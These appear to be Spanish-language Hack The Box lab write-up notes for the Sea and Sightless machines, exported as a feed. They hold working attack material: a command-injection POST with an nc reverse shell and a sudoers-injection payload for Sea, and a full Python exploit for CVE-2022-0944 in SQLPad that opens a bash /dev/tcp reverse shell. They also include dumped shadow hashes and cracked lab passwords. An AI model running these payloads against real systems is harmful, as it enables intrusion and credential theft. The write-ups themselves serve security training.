proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
amay:x:1000:1000:amay:/home/amay:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
geo:x:1001:1001::/home/geo:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false**
<br>Pruebo la password con los diferentes usuarios que poseen una terminal:<br>
<img alt="Pasted image 20241122132341.png" src="machines/sea/sea-images/pasted-image-20241122132341.png"><br><br>Vamos a establecer persistencia, para ello copio mi clave ssh publica<br><img alt="Pasted image 20241122132806.png" src="machines/sea/sea-images/pasted-image-20241122132806.png"><br><br>
<br>XSS -&gt; www-data
<br>/var/www/sea/data/database.js &lt;-- bcrypt(blowfish) password hash 
<br>]]></description><link>machines/sea/02-exploitation.html</link><guid isPermaLink="false">Machines/Sea/02-exploitation.md</guid><pubDate>Fri, 22 Nov 2024 13:13:23 GMT</pubDate><enclosure url="machines/sea/sea-images/pasted-image-20241122132341.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sea/sea-images/pasted-image-20241122132341.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>User : Amay Password: mychemicalromance
<br><br>
<br>sudo -l 
<br>PATH TRAVERSAL --&gt;on localhost:8080 
<br>Si hacemos un sudo -l vemos que amay tiene permisos de sudo en todo <br><img alt="Pasted image 20241122141551.png" src="machines/sea/sea-images/pasted-image-20241122141551.png"><br><br>Le quito los permisos a amay con sudo visudo y continuamos con el escalado.<br>sudo -l no nos permite sudo en la maquina como user amay:<br>amay@sea:~$ sudo -l 
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea
<br>netstat -tulnp nos muestra el puerto 8080 donde hay un servidor web:<br>amay@sea:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33749         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      4624/ssh            
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      4914/ssh            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

amay@sea:~$ curl -I http://localhost:8080
HTTP/1.0 401 Unauthorized
Host: localhost:8080
Date: Fri, 22 Nov 2024 13:23:59 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
WWW-Authenticate: Basic realm="Restricted Area"
Content-type: text/html; charset=UTF-8


amay@sea:~$ curl -u "amay:mychemicalromance" -I http://localhost:8080
HTTP/1.1 200 OK
Host: localhost:8080
Date: Fri, 22 Nov 2024 13:24:40 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.23
Content-type: text/html; charset=UTF-8
<br>Vamos a crear un puente a nuestro host que mapee el puerto 8080 con la de la maquina<br> ssh -L 8080:localhost:8080 amay@sea.htb -i seakey
<br>La maquina nos muestra un panel de control:<br><img alt="Pasted image 20241122142646.png" src="machines/sea/sea-images/pasted-image-20241122142646.png"><br><br>Cuando le damos a analyze el servidor manda la siguiente peticion POST<br>
<img alt="Pasted image 20241122143542.png" src="machines/sea/sea-images/pasted-image-20241122143542.png"><br>Podemos modificar el POST para que apunte a por ejemplo /etc/shadow<br><img alt="Pasted image 20241122143711.png" src="machines/sea/sea-images/pasted-image-20241122143711.png"><br><br><img alt="Pasted image 20241122143748.png" src="machines/sea/sea-images/pasted-image-20241122143748.png"><br>Podemos ver el /etc/shadow pero el sistema estara usando cat por detras, podemos injectar comandos?<br><br><img alt="Pasted image 20241122145305.png" src="machines/sea/sea-images/pasted-image-20241122145305.png"><br>Modificando la inejccion descubro que el caracter ";" para finalizar el comando no funciona pero si el "+# " para terminar donde el "+" se url-encodea como un espacio en la peticion <br>La peticion post final se ve asi <br>POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8081/
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=/etc/shadow%26%26id+#&amp;analyze_log=
<br>Donde:<br>
<br>&amp;&amp; --&gt; se URL-encodea como %26%26
<br>Response:<br>root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0:19775:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19774:0:99999:7:::
sshd:*:19774:0:99999:7:::
systemd-coredump:!!:19774::::::
amay:$6$S1AGe5ex2k4D5MKa$gTclSeJwvND3FINpZaK0zfUqk6T9IkhlxCn17fNWLx56u.zP/f/4e5YrJRPsM3TRuuKXQDfYL44RyPzduexsm.:19775:0:99999:7:::
lxd:!:19774::::::
geo:$6$5mAIqOze4GJ4s9Zu$P3IgUSHlcCkKpDJ0862IgP5aqaNilEUZDGIm16FiWdxh1A5dfKjmwhMgp3xctHiHZVWGtmKY25cCrILanDPaG.:19934:0:99999:7:::
_laurel:!:19936::::::
uid=0(root) gid=0(root) groups=0(root)
&lt;p class='error'&gt;Suspicious traffic patterns detected in /etc/shadow&amp;&amp;id #:&lt;/p&gt;&lt;pre&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/pre&gt;        &lt;/div&gt;

    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

<br>Podemos injectar comandos entonces, podemos enviar una reverse-shell o darle permisos de sudo al user amay<br>Voy a usar una reverse shell con netcat que saque del siguiente documento<br>
(Rev-shells](<a rel="noopener nofollow" class="external-link" href="https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/" target="_blank">https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/</a>)<br>En la máquina del atacante:<br><br>En la máquina de la víctima:<br><br>En el caso de Netcat podemos encontrarnos el caso de que este instalada una versión de Netcat que no soporte la opción -e, entonces usaremos el siguiente comando en vez del antes indicado:<br><br>Que url-encodeado se veria asi <br>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.184%204440%20%3E%2Ftmp%2Ff
<br><br>La peticion final se ve asi <br>POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8081/
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
log_file=/etc/passwd+%26%26rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.184%204440%20%3E%2Ftmp%2Ff%3Bsleep+60+#&amp;analyze_log=
<br><img alt="Pasted image 20241122153243.png" src="machines/sea/sea-images/pasted-image-20241122153243.png"><br>Otra opcion es poner a amay en el sudoers file<br>/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+&gt;+/etc/sudoers.d/amay+#
<br>Luego sudo su desde el usuario amay y listo.]]></description><link>machines/sea/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Sea/03-post-exploitation.md</guid><pubDate>Fri, 22 Nov 2024 16:19:49 GMT</pubDate><enclosure url="machines/sea/sea-images/pasted-image-20241122141551.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sea/sea-images/pasted-image-20241122141551.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Sea]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/0011f6725aed869f8683589cb08c90d0.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 620
active:: False
name:: Sea
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 3.5
created:: 01/25/2025
published:: 08/10/24
avatar:: /storage/avatars/0011f6725aed869f8683589cb08c90d0.png
tags:: 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/sea/sea.html</link><guid isPermaLink="false">Machines/Sea/Sea.md</guid><pubDate>Sat, 25 Jan 2025 18:07:20 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/0011f6725aed869f8683589cb08c90d0.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/0011f6725aed869f8683589cb08c90d0.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[CVE-2022-0944]]></title><description><![CDATA[ 
 <br><br>Versiones afectadas : SQLmap &lt;= 6.10.0<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944" target="_blank">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a><br><br><br>
<br>
<br><br>
<br>
<br>]]></description><link>machines/sightless/cves/cve-2022-0944.html</link><guid isPermaLink="false">Machines/Sightless/CVES/CVE-2022-0944.md</guid><pubDate>Tue, 19 Nov 2024 19:48:44 GMT</pubDate></item><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><br><br><br><br><br><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/sightless/00-index.html</link><guid isPermaLink="false">Machines/Sightless/00-index.md</guid><pubDate>Tue, 19 Nov 2024 19:48:44 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br>/// Correos <br>sales@sightless.htb
john@sightless.htb
admin@sightless.htb
<br>/// Usuarios<br>
<a data-tooltip-position="top" aria-label="mailto:michael@sightless.htb" rel="noopener nofollow" class="external-link" href="mailto:michael@sightless.htb" target="_blank">michael@sightless.htb</a><br>
<br>/// Passwords<br><br><br><br><br>Ports tcp open in nmap format<br># Nmap 7.94SVN scan initiated Mon Nov 18 16:42:57 2024 as: nmap -sS -vvv -n -Pn -p- --min-rate 5000 -oN sscan sightl&gt;
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Nov 18 16:43:12 2024 -- 1 IP address (1 host up) scanned in 15.07 seconds
<br>Ports services and versions nmap format<br># Nmap 7.94SVN scan initiated Mon Nov 18 16:57:22 2024 as: nmap -sCV -vvv -n -Pn -p 21,22,80 --min-rate 5000 -oN Rec&gt;
Nmap scan report for sightless.htb (10.10.11.32)
Host is up, received user-set (0.039s latency).
Scanned at 2024-11-18 16:57:22 CET for 68s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnk&gt;
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Sightless.htb
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerpr&gt;
SF-Port21-TCP:V=7.94SVN%I=7%D=11/18%Time=673B63ED%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 18 16:58:30 2024 -- 1 IP address (1 host up) scanned in 68.48 seconds

<br>Ports UDP nmap format<br><br><br><br><br><img alt="Pasted image 20241118170222.png" src="machines/sightless/sightless-images/pasted-image-20241118170222.png"><br><br>wfuzz -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://sightless.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sightless.htb/FUZZ
Total requests: 3024

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000001337:   301        7 L      12 W       178 Ch      "images"                                            

Total time: 12.00577
Processed Requests: 3024
Filtered Requests: 3023
Requests/sec.: 251.8787

<br><br><br>Descubrimos subdominio  gracias a un redirect en un botón de la pagina web:<br>
// <a rel="noopener nofollow" class="external-link" href="http://sqlpad.sightless.htb/" target="_blank">http://sqlpad.sightless.htb/</a> //<br>echo "10.10.11.32 sqlpad.sightless.htb " &gt;&gt; /etc/hosts 
<br><img alt="Pasted image 20241118171259.png" src="machines/sightless/sightless-images/pasted-image-20241118171259.png"><br>SQLPad is a web app for writing and running SQL queries and visualizing the results. Supports Postgres, MySQL, SQL Server, ClickHouse, Crate, Vertica, Trino, Presto, Pinot, Drill, SAP HANA, BigQuery, SQLite, TiDB and many others via ODBC.<br>En la opcion "New unsaved query " descubrimos dos correos extra guardados en la pagina<br>
<img alt="Pasted image 20241118173418.png" src="machines/sightless/sightless-images/pasted-image-20241118173418.png"><br><a data-tooltip-position="top" aria-label="mailto:john@sightless.htb" rel="noopener nofollow" class="external-link" href="mailto:john@sightless.htb" target="_blank">john@sightless.htb</a><br>
<a data-tooltip-position="top" aria-label="mailto:admin@sightless.htb" rel="noopener nofollow" class="external-link" href="mailto:admin@sightless.htb" target="_blank">admin@sightless.htb</a><br>En la parte superior derecha encontramos la opcion "about"<br>
Observamos la version del SqlPad, es vulnerave al <a data-tooltip-position="top" aria-label="obsidian://open?vault=HTB&amp;file=Machines%2FSightless%2FCVES%2FCVE-2022-0944" rel="noopener nofollow" class="external-link" href="obsidian://open?vault=HTB&amp;file=Machines%2FSightless%2FCVES%2FCVE-2022-0944" target="_blank">CVE-2022-0944</a><br><img alt="Pasted image 20241118183714.png" src="machines/sightless/sightless-images/pasted-image-20241118183714.png">]]></description><link>machines/sightless/01-recon.html</link><guid isPermaLink="false">Machines/Sightless/01-recon.md</guid><pubDate>Thu, 21 Nov 2024 12:14:40 GMT</pubDate><enclosure url="machines/sightless/sightless-images/pasted-image-20241118170222.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sightless/sightless-images/pasted-image-20241118170222.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>CVE-2022-0944   (<a data-tooltip-position="top" aria-label="https://vuldb.com/es/?id.194925" rel="noopener nofollow" class="external-link" href="https://vuldb.com/es/?id.194925" target="_blank">vulnhub</a>)
<br>
<br><br><br>Versiones afectadas : SQLmap &lt;= 6.10.0<br>Usamos el siguiente script de python que explota esta vulnerabilidad:<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944" target="_blank">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a><br><br><br>import argparse
import requests

def main():
   
    parser = argparse.ArgumentParser(description="CVE-2022-0944 RCE Exploit")
    parser.add_argument('root_url', help="Root URL of the SQLPad application")
    parser.add_argument('attacker_ip', help="attacker ip")
    parser.add_argument('attacker_port', help="attacker port")
    
    args = parser.parse_args()

    target_url = f"{args.root_url}/api/test-connection"

    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0&gt;&amp;1\"') }}}}"

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    #POST data (JSON body of the request)
    data = {
        "name": "test",
        "driver": "mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

    try:
        response = requests.post(target_url, headers=headers, json=data)
       
        print(f"Response status code: {response.status_code}")
        print(f"Response body: {response.text}")

        if response.status_code == 200:
            print(f"Exploit sent successfully. Check your listener on {args.attacker_ip}:{args.attacker_port}")
        else:
            print(f"Exploit sent, but server responded with status code: {response.status_code}. Check your listener.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
<br>El codigo manda un exploit a la url indicada realizando una reverse shell , el codigo se aprovecha de la vulnerabilidad de la API  en la ruta "/api/test-connection"<br><img alt="Pasted image 20241119185337.png" src="machines/sightless/sightless-images/pasted-image-20241119185337.png"><br><br><br><br>Primero observamos que estamos en un contenedor de docker , nos dirigimos a la raiz<br>root@c184118df0a6:/# ls

bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6: cat docker-entrypoint
#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@
root@c184118df0a6:/# 
<br>En /etc/passwd encontramos los siguientes ususarios que puede que existan en el host:<br>root@c184118df0a6:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
<br>el /etc/shadow :<br>root@c184118df0a6:/# cat /etc/shadow
cat /etc/shadow
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:$6$Xp276NMNA6SRQH7D$YxEGuHfFCxPINnra/Xld5xsAX03aw0oBPgdinsiUTQjbrxGbS1zZeSW.IH.brqu2PlQofZUJqkJFUisre0aa90:20046:0:99999:7:::
<br>parece que el hash del usuario michael se encuentra en ambos pasamos a desencriptarlo con la herramienta john:<br>
<img alt="Pasted image 20241119191009.png" src="machines/sightless/sightless-images/pasted-image-20241119191009.png"><br>insaneclownposse
<br>Ahora que tenemos la clave de michael probamos a loguearnos en el host:<br>➜  exploitation ssh michael@sightless.htb
michael@sightless.htb's password: 
Last login: Tue Nov 19 18:05:31 2024 from 10.10.15.18
michael@sightless:~$ cat user.txt 
ea55a45b7839e324eec11ccd9da90093
<br>Ya tenemos la user flag!<br>En /var/lib/sqlpad encontramos :<br>root@c184118df0a6:/var/lib/sqlpad# ls
cache
sessions
sqlpad.sqlite
root@c184118df0a6:/var/lib/sqlpad# 
<br>Nos pasamos el sqlpad.sqlite a nuestra maquina<br><br>
<br>/var/lib/sqlpad
<br>/etc/passwd
<br>/etc/shadow
<br><br>-  hash de usuario en /etc/shadow
<br>]]></description><link>machines/sightless/02-exploitation.html</link><guid isPermaLink="false">Machines/Sightless/02-exploitation.md</guid><pubDate>Tue, 19 Nov 2024 19:48:44 GMT</pubDate><enclosure url="machines/sightless/sightless-images/pasted-image-20241119185337.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sightless/sightless-images/pasted-image-20241119185337.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>No podemos usar sudo -l ;<br><br>Miramos el /etc/hosts para encontrar posibles subdominios:<br>michael@sightless:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb
<br><br>Usamos el netstat -nlpt para saber que conexiones tenemos habilitadas <br>michael@sightless:~$ netstat -nlpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50451         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42253         0.0.0.0:*               LISTEN      24744/ssh           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34299         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33813         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -               
<br>Encontramos el puerto 8080 en local que parece sospechoso, hacemos pivoting con chisel a nuestra maquina host<br>En la maquina atacante (host) :<br>~$ ./chisel server --reverse -p 4443
2024/11/19 18:24:37 server: Reverse tunnelling enabled
2024/11/19 18:24:37 server: Fingerprint mgcPNujuLSpfpQBzbLkIZboBivlQthrSFr3kTDAsp6A=
2024/11/19 18:24:37 server: Listening on http://0.0.0.0:4443
<br>En la maquina victima :<br>$ ./chisel client 10.10.11.32:4443 R:8080:127.0.0.1:8080   
2024/11/19 19:43:26 client: Connecting to ws://10.10.11.32:4443
<br><img alt="Pasted image 20241119200213.png" src="machines/sightless/sightless-images/pasted-image-20241119200213.png"><br>
O también podemos crear un túnel ssh:<br>➜  exploitation ssh michael@sightless.htb -L 8080:127.0.0.1:8080
michael@sightless.htb's password: 
Warning: remote port forwarding failed for listen port 8080
Last login: Tue Nov 19 18:37:04 2024 from 10.10.16.63
<br>Una vez realizado el puente encontramos el admin panel de Froxlor en la 127.0.0.1:8080:<br><img alt="Pasted image 20241119200602.png" src="machines/sightless/sightless-images/pasted-image-20241119200602.png"><br>Podemos entrar con la cuenta de michael.<br><br>For getting access to Froxlor dashboard, we can use chrome remote debugger exploit<br>
There is an execution policy issue in PHP-FPM configuration for the user Michael in Foxlor.<br>
